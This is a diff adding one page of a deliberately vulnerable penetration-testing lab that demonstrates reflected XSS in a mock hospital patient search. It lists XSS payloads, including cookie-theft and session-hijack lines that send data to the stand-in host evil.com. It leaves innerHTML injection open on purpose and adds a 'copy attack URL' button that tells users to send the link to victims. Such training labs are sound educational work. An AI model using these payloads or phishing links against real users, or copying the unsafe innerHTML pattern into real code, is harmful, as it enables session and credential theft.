@@ -1,0 +1,172 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>XSS Reflected – MediCare Pro Lab</title>
+  <link rel="stylesheet" href="../css/styles.css">
+</head>
+<body>
+  <div class="warn-banner">⚠️ EDUCATIONAL USE ONLY — Deliberately vulnerable application for penetration testing practice.</div>
+  <div class="app-layout">
+    <div id="sidebarMount"></div>
+    <main class="main">
+      <div id="topnavMount"></div>
+      <div class="page-content">
+
+        <div class="vuln-header">
+          <div class="vuln-title-group">
+            <h1>🔗 XSS – Reflected</h1>
+            <p>Patient Search — Unsanitized Input Reflected Directly Into DOM</p>
+          </div>
+          <span class="severity-badge sev-high">⚠ High Severity</span>
+        </div>
+
+        <div class="hint-box">
+          <div class="hint-title">🧪 Lab Objective — XSS Payloads</div>
+          <p>User input from the search field is reflected into the page using <code>innerHTML</code> without encoding. The payload also appears in the URL <code>?name=PAYLOAD</code> — craft a malicious link to send victims.</p>
+          <ul style="margin-top:8px;">
+            <li>Basic alert: <code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code></li>
+            <li>Event-based: <code>&lt;img src=x onerror="alert('XSS')"&gt;</code></li>
+            <li>Cookie theft: <code>&lt;script&gt;fetch('https://evil.site?c='+document.cookie)&lt;/script&gt;</code></li>
+            <li>Session hijack: <code>&lt;script&gt;document.location='https://evil.site?s='+sessionStorage.getItem('mpro_user')&lt;/script&gt;</code></li>
+            <li>Defacement: <code>&lt;h1 style="color:red"&gt;HACKED&lt;/h1&gt;</code></li>
+          </ul>
+        </div>
+
+        <div class="grid-2">
+          <div class="card">
+            <div class="card-header">
+              <div class="card-icon card-icon-teal">🔍</div>
+              <h2>Patient Search</h2>
+            </div>
+            <div class="card-body">
+              <div class="alert alert-danger">
+                <span>🚨</span>
+                <div><strong>Vulnerability:</strong> The search term is inserted via <code>innerHTML</code> — scripts and HTML execute.</div>
+              </div>
+              <div class="form-group">
+                <label class="form-label">Search Patient Name</label>
+                <input type="text" class="form-control" id="searchInput" placeholder='Try: <img src=x onerror="alert(1)">'>
+              </div>
+              <button class="btn btn-primary" onclick="doSearch()">Search</button>
+              <button class="btn btn-outline" onclick="shareLink()" style="margin-left:8px;">📎 Copy Attack URL</button>
+
+              <div style="margin-top:20px;" id="searchResults" class="hidden">
+                <div class="divider"></div>
+                <div style="font-size:13px;color:var(--gray-700);margin-bottom:12px;">
+                  Showing results for: "<span id="reflectedOutput" style="color:var(--blue-600);"><!-- INJECTION POINT --></span>"
+                </div>
+                <table class="data-table">
+                  <thead><tr><th>Patient ID</th><th>Name</th><th>Department</th><th>Status</th></tr></thead>
+                  <tbody id="mockResults"></tbody>
+                </table>
+              </div>
+            </div>
+          </div>
+
+          <div class="card">
+            <div class="card-header">
+              <div class="card-icon card-icon-red">⚡</div>
+              <h2>XSS Payload Library</h2>
+            </div>
+            <div class="card-body">
+              <div style="display:flex;flex-direction:column;gap:8px;">
+                <button class="btn btn-outline btn-sm" style="text-align:left;font-family:monospace;font-size:10.5px;word-break:break-all;" onclick="injectPayload(`<script>alert('XSS — Cookie: '+document.cookie)<\/script>`)">alert() with cookie leak</button>
+                <button class="btn btn-outline btn-sm" style="text-align:left;font-family:monospace;font-size:10.5px;" onclick="injectPayload(`<img src=x onerror=alert('XSS via img tag')>`)">img onerror event</button>
+                <button class="btn btn-outline btn-sm" style="text-align:left;font-family:monospace;font-size:10.5px;" onclick="injectPayload(`<svg onload=alert('SVG XSS')>`)">SVG onload</button>
+                <button class="btn btn-outline btn-sm" style="text-align:left;font-family:monospace;font-size:10.5px;" onclick="injectPayload(`<details open ontoggle=alert('Toggle XSS')>`)">HTML5 ontoggle</button>
+                <button class="btn btn-outline btn-sm" style="text-align:left;font-family:monospace;font-size:10.5px;" onclick="injectPayload(`<h2 style='color:red;background:yellow;padding:10px'>🚨 PAGE DEFACED</h2>`)">Defacement</button>
+                <button class="btn btn-outline btn-sm" style="text-align:left;font-family:monospace;font-size:10.5px;" onclick="injectPayload(`<script>let d=JSON.parse(sessionStorage.getItem('mpro_user'));alert('Stolen: '+JSON.stringify(d))<\/script>`)">Steal session data</button>
+              </div>
+
+              <div class="divider" style="margin:16px 0;"></div>
+
+              <div class="alert alert-info" style="font-size:12px;">
+                <span>💡</span>
+                <div>The URL parameter <code>?name=PAYLOAD</code> is also vulnerable. Share the crafted URL to attack victims who click it.</div>
+              </div>
+
+              <div style="font-size:12px;font-weight:600;color:var(--gray-700);margin-bottom:8px;margin-top:8px;">Current Attack URL:</div>
+              <div style="background:var(--gray-100);border-radius:6px;padding:10px;font-family:monospace;font-size:10.5px;word-break:break-all;color:var(--gray-700);" id="attackUrl">
+                Perform a search to generate attack URL
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <div class="card mt-6" style="margin-top:20px;">
+          <div class="card-header">
+            <div class="card-icon card-icon-red">🐛</div>
+            <h2>Vulnerable Code</h2>
+          </div>
+          <div class="card-body">
+            <div class="code-block">
+<span class="c-comment">// ❌ VULNERABLE — direct innerHTML injection</span>
+<span class="c-kw">const</span> query = <span class="c-kw">new</span> URLSearchParams(location.search).get(<span class="c-str">'name'</span>);
+document.getElementById(<span class="c-str">'output'</span>).innerHTML = <span class="c-str">`Results for: "${query}"`</span>; <span class="c-comment">// ← XSS here</span>
+
+<span class="c-comment">// ✅ SECURE — encode before inserting</span>
+<span class="c-kw">const</span> safe = query.replace(/[&lt;&gt;"']/g, c => (<span class="c-str">'&#'</span>+c.charCodeAt(0)+<span class="c-str">';'</span>));
+document.getElementById(<span class="c-str">'output'</span>).textContent = <span class="c-str">`Results for: "${safe}"`</span>;
+            </div>
+          </div>
+        </div>
+
+      </div>
+    </main>
+  </div>
+
+  <script src="../js/app.js"></script>
+  <script>
+    document.getElementById('sidebarMount').outerHTML = renderSidebar('xss-reflected.html');
+    document.getElementById('topnavMount').outerHTML = renderTopnav('XSS – Reflected', 'Patient Search — Input reflected into DOM without sanitization');
+
+    // Check URL param on load (simulating the attack)
+    const urlParam = new URLSearchParams(location.search).get('name');
+    if (urlParam) {
+      document.getElementById('searchInput').value = urlParam;
+      doSearch();
+    }
+
+    const MOCK_PATIENTS = [
+      { id: 'P-001', name: 'Maria Santos', dept: 'Cardiology', status: 'Admitted' },
+      { id: 'P-002', name: 'Juan Dela Cruz', dept: 'Endocrinology', status: 'Outpatient' },
+      { id: 'P-003', name: 'Ana Reyes', dept: 'Pulmonology', status: 'Admitted' },
+    ];
+
+    function doSearch() {
+      const input = document.getElementById('searchInput').value;
+      const results = document.getElementById('searchResults');
+      const reflected = document.getElementById('reflectedOutput');
+      const tbody = document.getElementById('mockResults');
+
+      results.classList.remove('hidden');
+
+      // ❌ VULNERABLE: innerHTML — scripts and HTML execute
+      reflected.innerHTML = input;
+
+      // Update attack URL
+      const url = `${location.origin}${location.pathname}?name=${encodeURIComponent(input)}`;
+      document.getElementById('attackUrl').textContent = url;
+
+      // Mock results
+      const filtered = MOCK_PATIENTS.filter(p => p.name.toLowerCase().includes(input.toLowerCase().replace(/<[^>]*>/g, '')));
+      tbody.innerHTML = (filtered.length ? filtered : MOCK_PATIENTS).map(p =>
+        `<tr><td>${p.id}</td><td>${p.name}</td><td>${p.dept}</td><td><span style="background:var(--teal-100);color:var(--teal-600);padding:2px 8px;border-radius:20px;font-size:11px;font-weight:600;">${p.status}</span></td></tr>`
+      ).join('');
+    }
+
+    function injectPayload(p) {
+      document.getElementById('searchInput').value = p;
+      doSearch();
+    }
+
+    function shareLink() {
+      const input = document.getElementById('searchInput').value;
+      const url = `${location.origin}${location.pathname}?name=${encodeURIComponent(input)}`;
+      navigator.clipboard.writeText(url).then(() => alert('Attack URL copied to clipboard!\n\nSend this link to a victim — when they open it, the script executes in their browser.'));
+    }
+  </script>
+</body>
+</html>
